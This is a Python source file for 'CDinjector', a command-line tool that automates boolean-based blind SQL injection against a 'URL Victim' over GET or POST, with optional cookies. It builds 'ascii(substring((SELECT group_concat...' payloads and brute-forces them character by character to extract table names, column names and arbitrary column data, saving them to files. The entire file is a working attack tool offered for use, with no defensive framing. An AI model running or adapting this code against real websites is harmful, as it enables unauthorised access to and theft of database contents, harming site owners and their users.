# !CDinjector made by impulseControlDisorder
# Please don't delete this marker

import sys
import requests
import argparse

class Injector:
    gagal = 0
    angkake = 1
    bener = 0
    hasil = []
    table_result = ''
    column_result = ''
    data_result = ''
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    def __init__(self,url,fq,pog,cookiez,kov,vok,kod,vod,ts,lo):
        self.url = url
        self.fq = fq
        self.pog = pog
        self.pog = self.pog.lower()
        self.cookiez = cookiez
        self.cookiez = self.cookiez.lower()
        self.kov = kov
        self.vok = vok
        self.kod = kod
        self.vod = vod
        self.truestring = ts
        self.logicaloperator = lo
        self.ascii = [44,46,47,95]
        self.query = ''
        self.datana = {}
        self.cookies={}
        self.listofkey=[]
        self.listofvalue=[]
        self.datakey=[]
        self.datavalue=[]

    ######### PRINT WELCOME MSG ##########
    def welcome(self):
        print("""
---------------------------------------------------
  / __   __               ___  __  ___    __
 / /  ` |  \ | |\ |    | |__  /  `  |  | /  \ |\ |
.  \__, |__/ | | \| \__/ |___ \__,  |  | \__/ | \|
    impulse(!Control)Disorder Auto BlindSQLi
---------------------------------------------------
        """)

    ######### PRINT ERROR MSG ###########
    def printerror(self):
        print('Watch the tutorial before use this tool(https://youtu.be/O_KN-qVAguc)')

    ######### PRINT SUCCEED MSG #########
    def printsucceed(self):
        print("""
\n---------------
    SUCCEED
---------------
        """)
        if self.tocod == 't':
            print('SUCCEED: your result saved into table_result.txt')
        elif self.tocod == 'c':
            print('SUCCEED: your result saved into column_result.txt')
        elif self.tocod == 'd':
            print('SUCCEED: your result saved into data_result.txt')

    ########### PRINT FAILED MESSAGE ##########
    def printfailed(self):
        print ("""
\n----------------
    FAILED
----------------
Check your url or maybe you need cookies and then try again.
        """)

    def filterurl(self):
        if self.url.find('http://') > -1:
            self.url = self.url
        elif self.url.find('https://') > -1:
            self.url = self.url.replace('https://','http://')
        else:
            self.url = 'http://'+self.url

    ########### OPEN THE FILES ############
    def openfiles(self):
        self.table_result = open('table_result.txt','w')
        self.column_result = open('column_result.txt','w')
        self.data_result = open('data_result.txt','w')

    ########## CLOSE THE FILES ############
    def closefiles(self):
        self.table_result.close()
        self.column_result.close()
        self.data_result.close()

    ########## QUERIES SPLITTING ##########
    def fixingqueries(self):
        fixq = self.fq.split(',')
        self.fq = fixq

    ######### ASCII MAKER ###########
    def buatascii(self):
        print(
        """
---------------------
Word for Bruteforce
---------------------
1.) [a-z(included symbols(, . / _))] (recommended for tables and columns)
2.) [A-Z(included symbols(, . / _))]
3.) [0-9(included symbols(, . / _))]
4.) [a-z,A-Z(included symbols(, . / _))]
5.) [a-z,0-9(included symbols(, . / _))]
6.) [A-Z,0-9(included symbols(, . / _))]
7.) [a-z,A-Z,0-9(included symbols(, . / _))] (DEFAULT)
        """)
        inputascii = input('select wordlist (blank means default): ')
        if inputascii == '1':
            for x in range(97,123):#(a-z)
                self.ascii.append(x)
        elif inputascii == '2':#(A-Z)
            for x in range(65,91):
                self.ascii.append(x)
        elif inputascii == '3':#(0-9)
            for x in range(48,58):
                self.ascii.append(x)
        #############################
        elif inputascii == '4':
            for x in range(97,123):
                self.ascii.append(x)
            for x in range(65,91):
                self.ascii.append(x)
        elif inputascii == '5':
            for x in range(97,123):
                self.ascii.append(x)
            for x in range(48,58):
                self.ascii.append(x)
        elif inputascii == '6':
            for x in range(65,91):
                self.ascii.append(x)
            for x in range(48,58):
                self.ascii.append(x)
        ############################
        elif inputascii == '7' or not inputascii:#(DEFAULT)
            for x in range(97,123):
                self.ascii.append(x)
            for x in range(65,91):
                self.ascii.append(x)
            for x in range(48,58):
                self.ascii.append(x)
        else:
            print('\nERROR: just choose 1/2/3/4/5/6/7 or leave it blank!')
            self.printerror()
            sys.exit(1)

    ############## POST DATA KEY N VALUE ###############
    def postdata(self):
        self.datakey = self.kod.split(",")
        self.datavalue = self.vod.split(",")
        zipbObj = zip(self.datakey,self.datavalue)
        dictOfWords = dict(zipbObj)
        self.datana = dictOfWords
        if self.datavalue[0] != '[injection-point]':
            print('\nERROR: where is the [injection-point] dude!!')
            print('[injection-point] must be on first value')
            self.printerror()
            sys.exit(1)

    ############## INPUT THE COOKIES ###############
    def inputcookies(self):
        listofkey=[]
        listofvalue=[]
        if self.cookiez == 'y' or self.cookiez == 'yes':
            self.listofkey = self.kov.split(',')
            self.listofvalue = self.vok.split(',')
            zipbObj = zip(self.listofkey,self.listofvalue)
            dictOfWords = dict(zipbObj)
            self.cookies = dictOfWords
            print("\n")
            kuk = self.cookies
            kuk = str(kuk)
            print("COOKIES: "+kuk)
        elif self.cookiez == 'n' or self.cookiez == 'no':
            self.cookies = {}
        else:
            print("\nERROR: choose (y)es/(n)o!!")
            self.printerror()
            sys.exit(1)

    ############ TABLES / COLUMNS / DATA ##############
    def tcd(self):
        print(
        """
-------------------------
TABLES / COLUMNS / DATA
-------------------------
[t]ables(default) | [c]olumns | [d]ata
        """)
        self.tocod = input('(t)/(c)/(d) | (blank means default): ')
        self.tocod = self.tocod.lower()

    ########### INJECTION QUERY FOR GET ##############
    def execg(self):
        if self.pog == 'g':
            if self.tocod == 't' or not self.tocod:
                self.query = self.logicaloperator+' ascii(substring((SELECT group_concat(table_name) from information_schema.tables where table_schema=database()'
            elif self.tocod == 'c':
                tablename = input('Table Name: ')
                tablename = tablename.encode('utf-8')
                self.query = self.logicaloperator+' ascii(substring((SELECT group_concat(column_name) from information_schema.columns where table_name={0}'.format('0x'+tablename.hex())
            elif self.tocod == 'd':
                dataname = input('Column Name: ')
                columnname = input('Table Name: ')
                self.query = self.logicaloperator+' ascii(substring((SELECT group_concat({0}) from {1}'.format(dataname,columnname)
            else:
                print('\nERROR: just choose t/c/d or leave it blank')
                self.printerror()
                sys.exit(1)

    ################################# EXECUTING ##############################
    def injecting(self):
        self.inputcookies()
        self.filterurl()
        self.welcome()
        self.fixingqueries()
        self.buatascii()
###############################################################################################################################################
###############################################################GET METHOD######################################################################
###############################################################################################################################################
        if self.pog == 'g' or self.pog == 'get':
            self.tcd()
            self.execg()
            self.openfiles()
            benarkah = self.truestring
            while True:
                for asciike in self.ascii:
                    try:
                        if self.url.find('[injection-point]') > -1:
                            r = requests.get(self.url.replace('[injection-point]','{0}'.format(self.fq[0])+self.query+' limit 0,1),{0},1))={1}{2}'.format(self.angkake,asciike,self.fq[1])), headers=self.headers, cookies=self.cookies, timeout=10)
                            #print(r.url)
                            r.raise_for_status()
                        else:
                            print('ERROR: Where is your injection-point!')
                            self.printerror()
                            sys.exit(1)
                    except requests.exceptions.HTTPError as e:
                        print(e)
                        sys.exit(1)
                    except requests.exceptions.Timeout:
                        print('ERROR: Request Timed Out!!')
                        sys.exit(1)
                    except requests.exceptions.RequestException as e:
                        print(e)
                        sys.exit(1)
                    sourcecode = r.text
                    if sourcecode.find(benarkah) > -1:
                        sys.stdout.write(chr(asciike))
                        sys.stdout.flush()
                        if self.tocod == 't':
                            self.table_result.write(chr(asciike))
                        elif self.tocod == 'c':
                            self.column_result.write(chr(asciike))
                        elif self.tocod == 'd':
                            self.data_result.write(chr(asciike))
                        self.bener+=1
                    asciike+=1
                if self.angkake == 1 and self.bener == 0:
                    self.gagal = 1
                    break
                if self.angkake != self.bener:
                    break
                self.angkake+=1
            if self.gagal == 1:
                self.printfailed()
            else:
                self.printsucceed()
            self.closefiles()
################################################################################################################################################
###############################################################POST METHOD######################################################################
################################################################################################################################################
        elif self.pog == 'p' or self.pog == 'post':
            self.postdata()
            self.tcd()
            if self.tocod == 'c':
                tablename = input('Table Name: ')
                tablename = tablename.encode('utf-8')
            elif self.tocod == 'd':
                columnname = input('Column Name: ')
                tablename = input('Table Name: ')
            print("""
---------------
VERIFICATION
---------------
            """)
            benarkah = self.truestring
            wbip = input("Words before injection-point: ")
            self.openfiles()
            while True:
                for asciike in self.ascii:
                    firststring = self.datakey[0]
                    if self.tocod == 't' or not self.tocod:
                        self.datana[firststring] = '{0}{1}{2} ascii(substring((SELECT group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{3},1))={4}{5}'.format(wbip,self.fq[0],self.logicaloperator,self.angkake,asciike,self.fq[1])
                    elif self.tocod == 'c':
                        self.datana[firststring] = '{0}{1}{2} ascii(substring((SELECT group_concat(column_name) from information_schema.columns where table_name={3} limit 0,1),{4},1))={5}{6}'.format(wbip,self.fq[0],self.logicaloperator,'0x'+tablename.hex(),self.angkake,asciike,self.fq[1])
                    elif self.tocod == 'd':
                        self.datana[firststring] = '{0}{1}{2} ascii(substring((SELECT group_concat({3}) from {4} limit 0,1),{5},1))={6}{7}'.format(wbip,self.fq[0],self.logicaloperator,columnname,tablename,self.angkake,asciike,self.fq[1])
                    else:
                        print('ERROR: just choose t/c/d or leave it blank')
                        self.printerror()
                        sys.exit(1)
                    try:
                        r = requests.post(self.url, data=self.datana, headers=self.headers, cookies=self.cookies, timeout=10)
                        r.raise_for_status()
                        #print(self.datana)
                    except requests.exceptions.HTTPError as e:
                        print(e)
                        sys.exit(1)
                    except requests.exceptions.Timeout:
                        print('ERROR: Request Timed Out!!')
                        sys.exit(1)
                    except requests.exceptions.RequestException as e:
                        print(e)
                        sys.exit(1)
                    sourcecode = r.text
                    if sourcecode.find(benarkah) > -1:
                        sys.stdout.write(chr(asciike))
                        sys.stdout.flush()
                        if self.tocod == 't':
                            self.table_result.write(chr(asciike))
                        elif self.tocod == 'c':
                            self.column_result.write(chr(asciike))
                        elif self.tocod == 'd':
                            self.data_result.write(chr(asciike))
                        self.bener+=1
                    asciike+=1
                if self.angkake == 1 and self.bener == 0:
                    self.gagal = 1
                    break
                if self.angkake != self.bener:
                    break
                self.angkake+=1
            if self.gagal == 1:
                self.printfailed()
            else:
                self.printsucceed()
            self.closefiles()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="example: watch this video https://youtu.be/O_KN-qVAguc",usage="%(prog)s [-h] [options]")
    parser.add_argument(
        "--url",
        type = str,
        required = True,
        help = 'URL Victim'
    )
    parser.add_argument(
        "--fq",
        type = str,
        required = True,
        help = 'Fixing Queries(seperated by comma). EXAMPLE: if(\')and(-- -)=( "\\\',-- -" ), if(")and(-- -)=(\'\\",-- -), if()and(-- -)=(" ,-- -") [reference: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/]'
    )
    parser.add_argument(
        "-m",
        "--method",
        type = str,
        required = True,
        help = 'Method POST or GET (p/g)'
    )
    parser.add_argument(
        "--keyofdata",
        type = str,
        help = '(IF METHOD POST) POST-DATA [KEY] (seperated by commas)'
    )
    parser.add_argument(
        "--valueofdata",
        type = str,
        help = '(IF METHOD POST) POST-DATA [VALUE] (seperated by commas)'
    )
    parser.add_argument(
        "--cookies",
        type = str,
        required = True,
        help = 'If use cookies, input "yes"/"y", if not, input "no"/"n". If "y"/"yes" you must input the --keyofvalue and --valueofkey'
    )
    parser.add_argument(
        "--keyofvalue",
        type = str,
        help = '(IF COOKIES YES) Key of cookies\'s dict (seperated by commas)'
    )
    parser.add_argument(
        "--valueofkey",
        type = str,
        help = '(IF COOKIES YES) Value of cookie\'s dict (seperated by commas)'
    )
    parser.add_argument(
        "--truestring",
        type = str,
        required = True,
        help = 'The string is appears only when the condition is TRUE'
    )
    parser.add_argument(
        "-lo",
        "--logicaloperator",
        type = str,
        required = True,
        help = "OR | AND (reference: https://dev.mysql.com/doc/refman/8.0/en/logical-operators.html)"
    )
    args = parser.parse_args()
    if args.method == 'p' or args.method == 'post':
        if args.keyofdata == None or args.valueofdata == None:
            print("\nERROR: if you use POST METHOD you must input the --keyofdata and --valueofdata")
            print('Watch the tutorial before use this tool(https://youtu.be/O_KN-qVAguc)')
            sys.exit(1)
    elif args.method == 'g' or args.method == 'get':
        args.valueofdata = ' '
        args.keyofdata = ' '
    else:
        print("\nERROR: the method "+args.method+" doesn't exists!")
        print('Watch the tutorial before use this tool(https://youtu.be/O_KN-qVAguc)')
        sys.exit(1)
    if args.cookies == 'y' or args.cookies == 'yes':
        if args.keyofvalue == None or args.valueofkey == None:
            print("\nERROR: if you input yes on cookies you must input the --keyofvalue and --valueofkey")
            print('Watch the tutorial before use this tool(https://youtu.be/O_KN-qVAguc)')
            sys.exit(1)
    elif args.cookies == 'n' or args.cookies == 'no':
        args.keyofvalue = " "
        args.valueofkey = " "
    else:
        print("Just YES or NO")
        sys.exit(1)
    inject = Injector(args.url,args.fq,args.method,args.cookies,args.keyofvalue,args.valueofkey,args.keyofdata,args.valueofdata,args.truestring,args.logicaloperator)
    inject.injecting()
